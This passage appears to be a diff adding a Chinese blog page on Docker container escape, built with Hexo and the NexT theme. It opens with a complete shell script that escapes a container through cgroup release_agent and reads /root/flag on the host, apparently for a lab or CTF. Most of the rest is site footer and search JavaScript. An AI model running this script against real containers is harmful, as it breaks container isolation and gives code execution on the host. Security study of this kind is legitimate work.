escape-release-agent.sh</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 1. 确认身份&quot;</span><br><span class="line">id</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 2. 确认 cgroup v1&quot;</span><br><span class="line">ls /sys/fs/cgroup/ | head -6</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 3. 挂载 freezer 子系统&quot;</span><br><span class="line">mkdir -p /tmp/c</span><br><span class="line">mount -t cgroup -o freezer cgroup /tmp/c 2&gt;/dev/null &amp;&amp; echo &quot;[+] mount ok&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 4. 计算宿主路径&quot;</span><br><span class="line">hp=$(sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab | head -1)</span><br><span class="line">echo &quot;host_path=$hp&quot;</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 5. 写 payload&quot;</span><br><span class="line">printf &#x27;#!/bin/sh\ncat /root/flag &gt; %s/output\n&#x27; &quot;$hp&quot; &gt; /payload.sh</span><br><span class="line">chmod +x /payload.sh</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 6. 注册 release_agent&quot;</span><br><span class="line">echo &quot;$hp/payload.sh&quot; &gt; /tmp/c/release_agent</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 7. 触发&quot;</span><br><span class="line">mkdir -p /tmp/c/x</span><br><span class="line">echo 1 &gt; /tmp/c/x/notify_on_release</span><br><span class="line">sh -c &quot;echo \$\$ &gt; /tmp/c/x/cgroup.procs&quot;</span><br><span class="line">sleep 2</span><br><span class="line"></span><br><span class="line">echo &quot;[*] 8. 读取 flag&quot;</span><br><span class="line">cat /output</span><br></pre></td></tr></table></figure>
+
+<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/rO_RrRqRzf2Qz_fYcwN3lw">https://mp.weixin.qq.com/s/rO_RrRqRzf2Qz_fYcwN3lw</a></p>
+<p><a target="_blank" rel="noopener" href="https://hexc2.com/wiki/escape-release-agent">https://hexc2.com/wiki/escape-release-agent</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/docker/" rel="tag"># docker</a>
+          
+            <a href="/tags/%E9%80%83%E9%80%B8/" rel="tag"># 逃逸</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2026/06/20/%E4%BD%BF%E7%94%A8easytier%E5%BC%82%E5%9C%B0%E7%BB%84%E7%BD%91/" rel="next" title="使用easytier异地组网">
+                <i class="fa fa-chevron-left"></i> 使用easytier异地组网
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E5%9C%A8docker%E5%AE%B9%E5%99%A8%E4%B8%AD"><span class="nav-number">1.</span> <span class="nav-text">判断是否在docker容器中</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E6%A3%80%E6%9F%A5-dockerenv-%E6%96%87%E4%BB%B6"><span class="nav-number">1.1.</span> <span class="nav-text">方法一：检查 &#x2F;.dockerenv 文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A%E6%9F%A5%E7%9C%8B-proc-1-cgroup"><span class="nav-number">1.2.</span> <span class="nav-text">方法二：查看 &#x2F;proc&#x2F;1&#x2F;cgroup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A%E8%A7%82%E5%AF%9F%E8%BF%9B%E7%A8%8B%E5%88%97%E8%A1%A8%E4%B8%8E-PID-1"><span class="nav-number">1.3.</span> <span class="nav-text">方法三：观察进程列表与 PID 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B%EF%BC%9A%E6%9F%A5%E7%9C%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E4%B8%8E%E6%8C%82%E8%BD%BD%E4%BF%A1%E6%81%AF"><span class="nav-number">1.4.</span> <span class="nav-text">方法四：查看环境变量与挂载信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Docker%E9%80%83%E9%80%B8"><span class="nav-number">2.</span> <span class="nav-text">Docker逃逸</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E4%B8%80%EF%BC%9A%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8"><span class="nav-number">2.1.</span> <span class="nav-text">类型一：特权容器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E4%BA%8C%EF%BC%9ASocket-%E6%B3%84%E9%9C%B2"><span class="nav-number">2.2.</span> <span class="nav-text">类型二：Socket 泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E4%B8%89%EF%BC%9A%E5%AE%BF%E4%B8%BB-PID-%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4"><span class="nav-number">2.3.</span> <span class="nav-text">类型三：宿主 PID 命名空间</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E5%9B%9B%EF%BC%9A%E8%83%BD%E5%8A%9B%E4%BD%8D%E6%94%BE%E5%A4%A7"><span class="nav-number">2.4.</span> <span class="nav-text">类型四：能力位放大</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B1%BB%E5%9E%8B%E4%BA%94%EF%BC%9Acgroup-release-agent"><span class="nav-number">2.5.</span> <span class="nav-text">类型五：cgroup release_agent</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-number">3.</span> <span class="nav-text">参考文献</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">h4ckforjob</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+    <div class="powered-by">
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <i class="fa fa-user-md"></i>
+    <span id="busuanzi_container_site_uv">
+        本站访客数: <span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_pv">
+        本站访问量: <span id="busuanzi_value_site_pv"></span>
+    </span>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
